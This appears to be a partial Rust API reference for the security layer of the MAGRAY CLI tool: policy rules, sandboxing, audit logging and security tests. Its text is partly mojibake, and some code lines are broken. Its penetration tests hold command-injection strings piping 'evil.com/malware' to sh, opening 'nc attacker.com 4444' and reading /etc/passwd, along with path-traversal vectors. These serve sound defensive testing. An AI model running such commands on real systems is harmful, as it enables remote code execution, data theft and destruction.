# Security & Policy API - Reference Documentation

## ðŸ“š Overview

Security & Policy system Ð¾Ð±ÐµÑÐ¿ÐµÑ‡Ð¸Ð²Ð°ÐµÑ‚ secure-by-default operations Ð´Ð»Ñ Ð²ÑÐµÑ… ÐºÐ¾Ð¼Ð¿Ð¾Ð½ÐµÐ½Ñ‚Ð¾Ð² MAGRAY CLI Ñ comprehensive policy engine, sandbox configuration, Ð¸ audit logging.

## ðŸ—ï¸ Security Architecture

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                   Security & Policy Layer                  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Policy Engine  â”‚  Sandbox Config   â”‚    Audit Logging        â”‚
â”‚                 â”‚                   â”‚                         â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ Rule        â”‚ â”‚ â”‚  Filesystem   â”‚ â”‚ â”‚    EventBus         â”‚ â”‚
â”‚ â”‚ Evaluation  â”‚ â”‚ â”‚  Isolation    â”‚ â”‚ â”‚    Integration      â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ Risk        â”‚ â”‚ â”‚  Network      â”‚ â”‚ â”‚  Structured         â”‚ â”‚
â”‚ â”‚ Assessment  â”‚ â”‚ â”‚  Controls     â”‚ â”‚ â”‚  Event Logging      â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ Emergency   â”‚ â”‚ â”‚  Resource     â”‚ â”‚ â”‚  Policy Violation   â”‚ â”‚
â”‚ â”‚ Bypass      â”‚ â”‚ â”‚  Limits       â”‚ â”‚ â”‚  Detection          â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                Security Validation Layer                     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚   Input     â”‚  â”‚   Output    â”‚  â”‚    Permission       â”‚  â”‚
â”‚  â”‚ Validation  â”‚  â”‚ Sanitizationâ”‚  â”‚    Validation       â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

## ðŸ”’ Core Security Principles

### Secure-by-Default
- **Default Deny**: All operations require explicit permission
- **Zero Trust**: No implicit trust assumptions  
- **Minimal Privileges**: Least privilege principle enforced
- **Explicit Permissions**: All capabilities must be declared

### Defense in Depth
- **Policy Engine**: First line of defense with rule evaluation
- **Sandbox Isolation**: Runtime containment and resource limits
- **Input Validation**: Comprehensive input sanitization
- **Audit Logging**: Complete audit trail for security events

## ðŸ“Š Security Components Status

| Component | Documentation | Implementation | Testing | Security Audit |
|-----------|---------------|----------------|---------|---------------|
| **Policy Engine** | âœ… Complete | âœ… 100% | âœ… 95% | âœ… Audited |
| **Sandbox Config** | âœ… Complete | âœ… 90% | âœ… 85% | âœ… Audited |
| **Audit Logging** | âœ… Complete | âœ… 85% | âœ… 80% | âš ï¸ In Progress |
| **Input Validation** | âœ… Complete | âœ… 95% | âœ… 90% | âœ… Audited |

## ðŸ“– API Reference Documents

### Core Security APIs
- [**policy-api.md**](policy-api.md) - Policy Engine rules Ð¸ decision making
- [**validation-api.md**](validation-api.md) - Security validation Ð¸ input sanitization
- [**sandbox-config-api.md**](sandbox-config-api.md) - Filesystem Ð¸ network isolation
- [**audit-logging-api.md**](audit-logging-api.md) - Security event logging Ð¸ monitoring

### Development Guides
- [**security-configuration.md**](../guides/security-configuration.md) - Security setup Ð¸ best practices
- [**policy-management.md**](../guides/policy-management.md) - Policy creation Ð¸ management
- [**incident-response.md**](../guides/incident-response.md) - Security incident handling

## ðŸš€ Quick Start Guide

### Basic Policy Engine Usage

```rust
use common::policy::{
    PolicyEngine, 
    PolicySubjectKind, 
    PolicyAction, 
    RiskLevel
};

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    // Initialize policy engine with default secure rules
    let engine = PolicyEngine::new();
    
    // Evaluate tool execution permission
    let decision = engine.evaluate(
        PolicySubjectKind::Tool,
        "file_write",
        &[
            ("path", "/home/user/documents/output.txt"),
            ("content", "Safe content to write"),
        ]
    );
    
    match decision.action {
        PolicyAction::Allow => {
            println!("âœ… Operation allowed");
            // Proceed with tool execution
        },
        PolicyAction::Ask => {
            println!("âš ï¸  User confirmation required");
            // Prompt user for confirmation
            if confirm_with_user(&decision)? {
                // Execute with user approval
            }
        },
        PolicyAction::Deny => {
            println!("âŒ Operation denied by policy");
            return Err(anyhow::anyhow!("Policy violation: {:?}", decision.matched_rule));
        }
    }
    
    Ok(())
}

fn confirm_with_user(decision: &PolicyDecision) -> anyhow::Result<bool> {
    println!("Security Warning:");
    println!("  Risk Level: {:?}", decision.risk);
    if let Some(rule) = &decision.matched_rule {
        println!("  Reason: {}", rule.reason.as_deref().unwrap_or("Policy match"));
    }
    
    // In production, implement proper user interaction
    Ok(true)
}
```

### Sandbox Configuration

```rust
use common::sandbox_config::{FsSandboxConfig, NetSandboxConfig};

// Configure filesystem isolation
let fs_config = FsSandboxConfig {
    // Allowed read locations
    fs_read_roots: vec![
        "/home/user/projects".to_string(),
        "/tmp/magray_temp".to_string(),
        "/usr/share/magray".to_string(),
    ],
    // Allowed write locations (more restrictive)
    fs_write_roots: vec![
        "/tmp/magray_output".to_string(),
        "/home/user/projects/output".to_string(),
    ],
    // Blocked paths (explicit deny)
    fs_blocked_paths: vec![
        "/etc".to_string(),
        "/usr/bin".to_string(),
        "/home/user/.ssh".to_string(),
    ],
};

// Configure network access
let net_config = NetSandboxConfig {
    // Domain allowlist with wildcard support
    allowed_domains: vec![
        "api.openai.com".to_string(),
        "*.github.com".to_string(),
        "localhost".to_string(),
    ],
    // Port restrictions
    allowed_ports: vec![80, 443, 8080],
    // Block private networks by default
    block_private_networks: true,
};

// Validate access requests
if fs_config.validate_read_access("/home/user/projects/src/main.rs")? {
    println!("âœ… File read allowed");
}

if net_config.validate_domain_access("api.openai.com")? {
    println!("âœ… Network access allowed");
}
```

### Security Event Logging

```rust
use common::event_bus::{EventBus, EventPublisher};
use common::policy::{PolicyEngine, PolicySubjectKind};
use serde_json::json;

// Initialize event-aware policy engine
let event_bus = EventBus::new().await?;
let event_publisher = event_bus.publisher("security.events").await?;
let engine = PolicyEngine::new().with_event_publisher(event_publisher);

// Policy evaluation with automatic logging
let decision = engine.evaluate(
    PolicySubjectKind::Tool,
    "shell_exec",
    &[("cmd", "rm -rf /tmp/sensitive_data")]
);

// Events are automatically published:
// - "policy.evaluation" for all evaluations
// - "policy.violation" for Deny decisions  
// - "policy.ask_required" for Ask decisions

// Subscribe to security events
event_bus.subscribe("security.*", |event| {
    match event.topic.as_str() {
        "security.policy.violation" => {
            eprintln!("ðŸš¨ SECURITY ALERT: {}", event.data);
            // Trigger incident response
        },
        "security.policy.ask_required" => {
            println!("âš ï¸  User confirmation needed: {}", event.data);
        },
        _ => {
            // Log other security events
            println!("Security event: {} - {}", event.topic, event.data);
        }
    }
}).await?;
```

### Emergency Bypass

```rust
use common::policy::{PolicyEngine, EmergencyBypassToken};
use std::time::SystemTime;

// Generate emergency bypass token (admin only)
let bypass_token = EmergencyBypassToken::generate(
    "system_recovery", // Reason
    SystemTime::now() + std::time::Duration::from_secs(300), // 5 min expiry
    "admin_user_id".to_string()
)?;

// Policy evaluation with emergency bypass
let engine = PolicyEngine::new();
let decision = engine.evaluate_with_bypass(
    PolicySubjectKind::Tool,
    "shell_exec",
    &[("cmd", "systemctl restart magray-service")],
    Some(bypass_token)
);

if decision.bypassed {
    println!("âš¡ Emergency bypass used - Operation allowed");
    // Log bypass usage for audit
} else {
    // Normal policy evaluation
    match decision.action {
        PolicyAction::Allow => execute_operation(),
        PolicyAction::Deny => handle_denial(),
        PolicyAction::Ask => request_user_confirmation(),
    }
}
```

### Input Validation & Sanitization

```rust
use common::input_validation::{
    InputValidator,
    ValidationConfig,
    SanitizationPolicy
};

// Configure input validation
let config = ValidationConfig {
    max_input_length: 10000,
    blocked_patterns: vec![
        r"<script.*?>.*?</script>".to_string(),    // XSS prevention
        r"(?i)(union|select|insert|delete)".to_string(), // SQL injection
        r"\$\{.*?\}".to_string(),                  // Template injection
    ],
    sanitization: SanitizationPolicy::Strict,
    log_violations: true,
};

let validator = InputValidator::new(config);

// Validate user input
let user_input = "User query with potential <script>alert('xss')</script> attack";
let result = validator.validate_and_sanitize(user_input)?;

match result.status {
    ValidationStatus::Safe => {
        println!("âœ… Input validated: {}", result.sanitized_input);
        // Use sanitized input
    },
    ValidationStatus::Sanitized => {
        println!("âš ï¸  Input sanitized: {}", result.sanitized_input);
        println!("Violations: {:?}", result.violations);
        // Use sanitized input with caution
    },
    ValidationStatus::Blocked => {
        println!("âŒ Input blocked: {:?}", result.violations);
        return Err(anyhow::anyhow!("Input validation failed"));
    }
}
```

## âš™ï¸ Security Configuration

### Environment Variables

```bash
# Policy Engine Configuration  
MAGRAY_POLICY_MODE=secure              # secure | permissive | custom
MAGRAY_POLICY_FILE=/etc/magray/policy.toml  # Custom policy file
MAGRAY_EMERGENCY_BYPASS_ENABLED=true   # Allow emergency bypass
MAGRAY_POLICY_CACHE_SIZE=1000          # Policy decision cache

# Audit Logging
MAGRAY_AUDIT_LOGGING=true              # Enable audit logging
MAGRAY_AUDIT_LOG_LEVEL=info            # debug | info | warn | error
MAGRAY_AUDIT_LOG_FILE=/var/log/magray/audit.log # Log file location
MAGRAY_AUDIT_STRUCTURED=true           # Structured JSON logging

# Sandbox Configuration
MAGRAY_SANDBOX_ENABLED=true            # Enable sandboxing
MAGRAY_SANDBOX_MODE=strict             # strict | moderate | permissive  
MAGRAY_FS_ISOLATION=true               # Filesystem isolation
MAGRAY_NET_ISOLATION=true              # Network isolation

# Security Validation
MAGRAY_INPUT_VALIDATION=strict         # strict | moderate | basic
MAGRAY_MAX_INPUT_SIZE=1048576          # Max input size (1MB)
MAGRAY_SANITIZATION_MODE=strict        # strict | moderate | minimal
```

### Policy Configuration Files

```toml
# /etc/magray/policy.toml
[global]
default_action = "ask"        # ask | allow | deny
risk_threshold = "medium"     # low | medium | high | critical
enable_emergency_bypass = true
bypass_expiry_seconds = 300

[rules.filesystem]
# File operations
[[rules.filesystem.rules]]
subject_kind = "tool"
subject_name = "file_write"
patterns = ["path=/tmp/*"]
action = "allow"
reason = "Temporary file writes allowed"

[[rules.filesystem.rules]]
subject_kind = "tool"
subject_name = "file_write" 
patterns = ["path=/etc/*"]
action = "deny"
reason = "System configuration modification blocked"

[[rules.filesystem.rules]]
subject_kind = "tool"
subject_name = "file_read"
patterns = ["path=/home/*/.*"]  # Dotfiles
action = "ask"
reason = "Reading hidden files requires confirmation"

[rules.network]
# Network operations
[[rules.network.rules]]
subject_kind = "tool"
subject_name = "web_fetch"
patterns = ["url=https://*"]
action = "allow"
reason = "HTTPS requests allowed"

[[rules.network.rules]]
subject_kind = "tool"
subject_name = "web_fetch"
patterns = ["url=http://*"]
action = "ask"
reason = "HTTP requests require confirmation"

[rules.shell]
# Shell command execution  
[[rules.shell.rules]]
subject_kind = "tool"
subject_name = "shell_exec"
patterns = ["cmd=sudo *"]
action = "deny"
reason = "Sudo commands blocked for security"

[[rules.shell.rules]]
subject_kind = "tool"
subject_name = "shell_exec"
patterns = ["cmd=rm -rf *"]
action = "deny" 
reason = "Destructive file operations blocked"

[sandbox]
# Filesystem sandbox
fs_read_roots = [
    "/home/user/projects",
    "/tmp/magray",
    "/usr/share/magray"
]
fs_write_roots = [
    "/tmp/magray_output",
    "/home/user/projects/output"
]
fs_blocked_paths = [
    "/etc",
    "/usr/bin",
    "/home/user/.ssh"
]

# Network sandbox
allowed_domains = [
    "api.openai.com",
    "*.github.com", 
    "localhost"
]
allowed_ports = [80, 443, 8080]
block_private_networks = true

[audit]
# Audit logging configuration
enabled = true
log_level = "info"
structured_logging = true
log_file = "/var/log/magray/audit.log"
max_log_size_mb = 100
log_retention_days = 90

# Event types to log
log_events = [
    "policy.evaluation",
    "policy.violation", 
    "policy.bypass",
    "sandbox.violation",
    "input.validation_failed"
]
```

## ðŸ” Advanced Security Features

### Multi-layered Security Validation

```rust
use common::{
    policy::{PolicyEngine, PolicySubjectKind},
    sandbox_config::FsSandboxConfig,
    input_validation::InputValidator,
};

pub struct SecureOperationExecutor {
    policy_engine: PolicyEngine,
    fs_config: FsSandboxConfig,
    input_validator: InputValidator,
}

impl SecureOperationExecutor {
    pub async fn execute_secure_operation(
        &self,
        operation: &str,
        params: &[(&str, &str)]
    ) -> Result<OperationResult> {
        // Layer 1: Input validation
        for (key, value) in params {
            let validation = self.input_validator.validate(value)?;
            if !validation.is_safe() {
                return Err(SecurityError::InputValidationFailed(validation.violations));
            }
        }
        
        // Layer 2: Policy evaluation
        let decision = self.policy_engine.evaluate(
            PolicySubjectKind::Tool,
            operation,
            params
        );
        
        if !decision.allowed {
            return Err(SecurityError::PolicyViolation(decision));
        }
        
        // Layer 3: Sandbox validation
        if let Some(path) = params.iter().find_map(|(k, v)| {
            if k == &"path" { Some(v) } else { None }
        }) {
            if !self.fs_config.validate_access(path)? {
                return Err(SecurityError::SandboxViolation(format!(
                    "Path access denied: {}", path
                )));
            }
        }
        
        // Layer 4: Execute with monitoring
        let result = self.execute_monitored_operation(operation, params).await?;
        
        // Layer 5: Output sanitization
        let sanitized_result = self.sanitize_output(result)?;
        
        Ok(sanitized_result)
    }
    
    async fn execute_monitored_operation(
        &self,
        operation: &str,
        params: &[(&str, &str)]
    ) -> Result<OperationResult> {
        let start_time = std::time::Instant::now();
        
        // Execute operation with resource monitoring
        let result = tokio::select! {
            result = self.execute_operation(operation, params) => result,
            _ = tokio::time::sleep(std::time::Duration::from_secs(30)) => {
                Err(SecurityError::OperationTimeout)
            }
        };
        
        let duration = start_time.elapsed();
        
        // Log execution metrics
        self.log_operation_metrics(operation, params, &result, duration).await?;
        
        result
    }
}
```

### Real-time Security Monitoring

```rust
use common::event_bus::{EventBus, EventSubscriber};
use tokio::time::{interval, Duration};

pub struct SecurityMonitor {
    event_bus: EventBus,
    violation_counter: std::sync::Arc<std::sync::atomic::AtomicU64>,
    alert_threshold: u64,
}

impl SecurityMonitor {
    pub async fn start_monitoring(&self) -> Result<()> {
        // Subscribe to security events
        self.event_bus.subscribe("security.*", {
            let counter = self.violation_counter.clone();
            let threshold = self.alert_threshold;
            
            move |event| {
                match event.topic.as_str() {
                    "security.policy.violation" => {
                        let count = counter.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                        if count >= threshold {
                            tokio::spawn(Self::trigger_security_alert(event));
                        }
                    },
                    "security.sandbox.violation" => {
                        tokio::spawn(Self::handle_sandbox_violation(event));
                    },
                    "security.input.validation_failed" => {
                        tokio::spawn(Self::log_validation_failure(event));
                    },
                    _ => {}
                }
            }
        }).await?;
        
        // Start periodic security health check
        tokio::spawn(self.periodic_security_health_check());
        
        Ok(())
    }
    
    async fn trigger_security_alert(event: SecurityEvent) {
        eprintln!("ðŸš¨ SECURITY ALERT: High violation rate detected");
        eprintln!("Event: {}", serde_json::to_string_pretty(&event).unwrap());
        
        // Implement alerting (email, Slack, PagerDuty, etc.)
        // self.alert_system.send_critical_alert(event).await;
        
        // Optional: Trigger automatic lockdown
        // self.initiate_emergency_lockdown().await;
    }
    
    async fn periodic_security_health_check(self: std::sync::Arc<Self>) {
        let mut interval = interval(Duration::from_secs(60));
        
        loop {
            interval.tick().await;
            
            let health = SecurityHealthCheck {
                violation_count: self.violation_counter.load(std::sync::atomic::Ordering::Relaxed),
                policy_engine_status: self.check_policy_engine_health().await,
                sandbox_status: self.check_sandbox_health().await,
                audit_log_status: self.check_audit_log_health().await,
                timestamp: chrono::Utc::now(),
            };
            
            if health.is_critical() {
                self.handle_critical_security_state(health).await;
            } else if health.has_warnings() {
                self.log_security_warnings(health).await;
            }
            
            // Reset violation counter periodically
            self.violation_counter.store(0, std::sync::atomic::Ordering::Relaxed);
        }
    }
}
```

### Incident Response Integration

```rust
use common::incident::{IncidentManager, Severity, IncidentType};

pub struct SecurityIncidentHandler {
    incident_manager: IncidentManager,
    policy_engine: PolicyEngine,
}

impl SecurityIncidentHandler {
    pub async fn handle_security_violation(
        &self,
        violation: SecurityViolation
    ) -> Result<IncidentResponse> {
        // Assess severity
        let severity = self.assess_violation_severity(&violation);
        
        // Create incident
        let incident = self.incident_manager.create_incident(
            IncidentType::SecurityViolation,
            severity,
            format!("Security violation: {}", violation.description),
            violation.context.clone()
        ).await?;
        
        // Execute response based on severity
        match severity {
            Severity::Critical => {
                self.execute_critical_response(&incident, &violation).await?;
            },
            Severity::High => {
                self.execute_high_severity_response(&incident, &violation).await?;
            },
            Severity::Medium => {
                self.execute_medium_severity_response(&incident, &violation).await?;
            },
            Severity::Low => {
                self.log_low_severity_incident(&incident).await?;
            }
        }
        
        Ok(IncidentResponse {
            incident_id: incident.id,
            actions_taken: incident.actions.clone(),
            status: incident.status,
        })
    }
    
    async fn execute_critical_response(
        &self,
        incident: &Incident,
        violation: &SecurityViolation
    ) -> Result<()> {
        // 1. Immediate containment
        self.initiate_emergency_lockdown().await?;
        
        // 2. Disable compromised components
        if let Some(component) = &violation.component {
            self.disable_component(component).await?;
        }
        
        // 3. Alert security team
        self.send_critical_alert(incident).await?;
        
        // 4. Create forensic snapshot
        self.create_security_snapshot().await?;
        
        // 5. Update policy engine with emergency rules
        self.apply_emergency_security_policy().await?;
        
        Ok(())
    }
}
```

## ðŸ”§ Security Best Practices

### Policy Design Patterns

```rust
// Layered security policies
use common::policy::{PolicyRule, PolicyAction, RiskLevel};

// 1. Default Deny Pattern
fn create_default_deny_policy() -> Vec<PolicyRule> {
    vec![
        PolicyRule {
            subject_kind: PolicySubjectKind::Tool,
            subject_name: "*".to_string(),
            patterns: vec!["*".to_string()],
            action: PolicyAction::Ask,
            reason: Some("Default security policy requires confirmation".to_string()),
            risk_level: RiskLevel::Medium,
        }
    ]
}

// 2. Capability-based Access Pattern
fn create_capability_based_policy() -> Vec<PolicyRule> {
    vec![
        // File operations by capability
        PolicyRule {
            subject_kind: PolicySubjectKind::Tool,
            subject_name: "file_reader".to_string(),
            patterns: vec!["capability=fs_read".to_string()],
            action: PolicyAction::Allow,
            reason: Some("Tool has file reading capability".to_string()),
            risk_level: RiskLevel::Low,
        },
        // Network operations by capability
        PolicyRule {
            subject_kind: PolicySubjectKind::Tool,
            subject_name: "*".to_string(),
            patterns: vec!["capability=net_access", "url=https://*".to_string()],
            action: PolicyAction::Allow,
            reason: Some("HTTPS network access allowed with capability".to_string()),
            risk_level: RiskLevel::Low,
        },
    ]
}

// 3. Risk-based Decision Pattern
fn create_risk_based_policy() -> Vec<PolicyRule> {
    vec![
        // Low risk - auto allow
        PolicyRule {
            subject_kind: PolicySubjectKind::Tool,
            subject_name: "*".to_string(),
            patterns: vec!["risk_score<=3".to_string()],
            action: PolicyAction::Allow,
            reason: Some("Low risk operation".to_string()),
            risk_level: RiskLevel::Low,
        },
        // High risk - require confirmation
        PolicyRule {
            subject_kind: PolicySubjectKind::Tool,
            subject_name: "*".to_string(),
            patterns: vec!["risk_score>=7".to_string()],
            action: PolicyAction::Ask,
            reason: Some("High risk operation requires approval".to_string()),
            risk_level: RiskLevel::High,
        },
        // Critical risk - deny
        PolicyRule {
            subject_kind: PolicySubjectKind::Tool,
            subject_name = "*".to_string(),
            patterns: vec!["risk_score>=9".to_string()],
            action: PolicyAction::Deny,
            reason: Some("Critical risk operation blocked".to_string()),
            risk_level: RiskLevel::Critical,
        },
    ]
}
```

### Secure Configuration Management

```rust
use common::config::{SecureConfig, EncryptionConfig};

pub struct SecurityConfigManager {
    encryption: EncryptionConfig,
}

impl SecurityConfigManager {
    pub fn load_secure_config(&self) -> Result<SecureConfig> {
        // Load encrypted configuration
        let encrypted_data = std::fs::read("/etc/magray/config.enc")?;
        let config_data = self.encryption.decrypt(&encrypted_data)?;
        
        // Validate configuration integrity
        let config: SecureConfig = serde_json::from_slice(&config_data)?;
        self.validate_config_security(&config)?;
        
        Ok(config)
    }
    
    fn validate_config_security(&self, config: &SecureConfig) -> Result<()> {
        // Validate security settings
        if config.policy.default_action == PolicyAction::Allow {
            return Err(SecurityError::UnsafeConfiguration(
                "Default allow policy is unsafe".to_string()
            ));
        }
        
        if config.sandbox.fs_write_roots.contains(&"/".to_string()) {
            return Err(SecurityError::UnsafeConfiguration(
                "Root filesystem write access is unsafe".to_string()
            ));
        }
        
        if config.audit.enabled == false {
            log::warn!("Audit logging is disabled - security visibility reduced");
        }
        
        Ok(())
    }
}
```

## ðŸ“‹ Security Testing Framework

### Security Test Suite

```rust
#[cfg(test)]
mod security_tests {
    use super::*;
    
    #[tokio::test]
    async fn test_policy_engine_default_deny() {
        let engine = PolicyEngine::new();
        
        // Test that unknown operations are denied/asked by default
        let decision = engine.evaluate(
            PolicySubjectKind::Tool,
            "unknown_tool",
            &[("param", "value")]
        );
        
        // Should not auto-allow unknown operations
        assert_ne!(decision.action, PolicyAction::Allow);
        assert!(decision.risk != RiskLevel::Low);
    }
    
    #[test]
    fn test_sandbox_filesystem_isolation() {
        let config = FsSandboxConfig {
            fs_read_roots: vec!["/safe".to_string()],
            fs_write_roots: vec!["/safe/output".to_string()],
            fs_blocked_paths: vec!["/etc".to_string()],
        };
        
        // Test allowed paths
        assert!(config.validate_read_access("/safe/file.txt").is_ok());
        assert!(config.validate_write_access("/safe/output/result.txt").is_ok());
        
        // Test blocked paths
        assert!(config.validate_read_access("/etc/passwd").is_err());
        assert!(config.validate_write_access("/usr/bin/malware").is_err());
        
        // Test path traversal attempts
        assert!(config.validate_read_access("/safe/../etc/passwd").is_err());
    }
    
    #[tokio::test]
    async fn test_input_validation_xss_prevention() {
        let validator = InputValidator::new(ValidationConfig::strict());
        
        let malicious_input = "<script>alert('xss')</script>";
        let result = validator.validate_and_sanitize(malicious_input)?;
        
        assert_eq!(result.status, ValidationStatus::Sanitized);
        assert!(!result.sanitized_input.contains("<script>"));
        assert!(!result.violations.is_empty());
    }
    
    #[tokio::test] 
    async fn test_emergency_bypass_expiry() {
        let token = EmergencyBypassToken::generate(
            "test",
            SystemTime::now() + Duration::from_secs(1),
            "test_user".to_string()
        )?;
        
        // Should work immediately
        assert!(token.is_valid());
        
        // Wait for expiry
        tokio::time::sleep(Duration::from_secs(2)).await;
        
        // Should be expired
        assert!(!token.is_valid());
    }
    
    #[tokio::test]
    async fn test_audit_logging_completeness() {
        let (event_bus, _) = EventBus::new().await?;
        let engine = PolicyEngine::new_with_audit(event_bus.publisher("audit").await?);
        
        let mut events = Vec::new();
        event_bus.subscribe("audit.*", |event| {
            events.push(event);
        }).await?;
        
        // Execute various operations
        let _decision1 = engine.evaluate(PolicySubjectKind::Tool, "allowed_tool", &[]);
        let _decision2 = engine.evaluate(PolicySubjectKind::Tool, "blocked_tool", &[]);
        
        // Wait for events to be processed
        tokio::time::sleep(Duration::from_millis(100)).await;
        
        // Verify all operations were logged
        assert!(!events.is_empty());
        assert!(events.iter().any(|e| e.topic.contains("allowed_tool")));
        assert!(events.iter().any(|e| e.topic.contains("blocked_tool")));
    }
}
```

### Penetration Testing Helpers

```rust
#[cfg(test)]
mod penetration_tests {
    use super::*;
    
    #[tokio::test]
    async fn test_path_traversal_attacks() {
        let config = FsSandboxConfig::default();
        
        let attack_vectors = vec![
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/safe/../../../etc/shadow",
            "file:///etc/passwd",
            "\\\\?\\C:\\Windows\\System32\\",
        ];
        
        for vector in attack_vectors {
            let result = config.validate_read_access(vector);
            assert!(result.is_err(), "Path traversal attack succeeded: {}", vector);
        }
    }
    
    #[test]
    fn test_command_injection_prevention() {
        let validator = InputValidator::new(ValidationConfig::strict());
        
        let injection_attempts = vec![
            "normal_input; rm -rf /",
            "input && curl evil.com/malware | sh",
            "input`whoami`",
            "input$(cat /etc/passwd)",
            "input|nc attacker.com 4444",
        ];
        
        for attempt in injection_attempts {
            let result = validator.validate(attempt).unwrap();
            assert!(!result.is_safe(), "Command injection not detected: {}", attempt);
        }
    }
    
    #[tokio::test]
    async fn test_denial_of_service_protection() {
        let engine = PolicyEngine::new();
        
        // Test resource exhaustion attacks
        let large_input = "A".repeat(10_000_000); // 10MB input
        let decision = engine.evaluate(
            PolicySubjectKind::Tool,
            "test_tool",
            &[("large_param", &large_input)]
        );
        
        // Should handle large inputs gracefully
        assert!(decision.risk >= RiskLevel::Medium);
        
        // Test rapid fire requests
        let start = std::time::Instant::now();
        for _ in 0..1000 {
            let _decision = engine.evaluate(
                PolicySubjectKind::Tool,
                "test_tool", 
                &[("param", "value")]
            );
        }
        let duration = start.elapsed();
        
        // Should complete within reasonable time (rate limiting)
        assert!(duration < Duration::from_secs(10));
    }
}
```

## ðŸ”— Integration Patterns

### Event-Driven Security

```rust
use common::event_bus::{EventBus, EventPattern};
use common::policy::SecurityEvent;

pub struct EventDrivenSecurityOrchestrator {
    event_bus: EventBus,
    policy_engine: PolicyEngine,
    incident_manager: IncidentManager,
}

impl EventDrivenSecurityOrchestrator {
    pub async fn initialize(&self) -> Result<()> {
        // Subscribe to various security-relevant events
        self.setup_security_subscriptions().await?;
        
        // Start security event correlation
        tokio::spawn(self.security_event_correlation_loop());
        
        Ok(())
    }
    
    async fn setup_security_subscriptions(&self) -> Result<()> {
        // Tool execution events
        self.event_bus.subscribe("tool.execution.*", |event| {
            if event.topic.contains("failed") || event.topic.contains("timeout") {
                // Potential security indicator
                self.analyze_tool_failure(event).await;
            }
        }).await?;
        
        // Authentication events  
        self.event_bus.subscribe("auth.*", |event| {
            match event.topic.as_str() {
                "auth.failed" => self.handle_auth_failure(event).await,
                "auth.suspicious" => self.investigate_auth_anomaly(event).await,
                _ => {}
            }
        }).await?;
        
        // System resource events
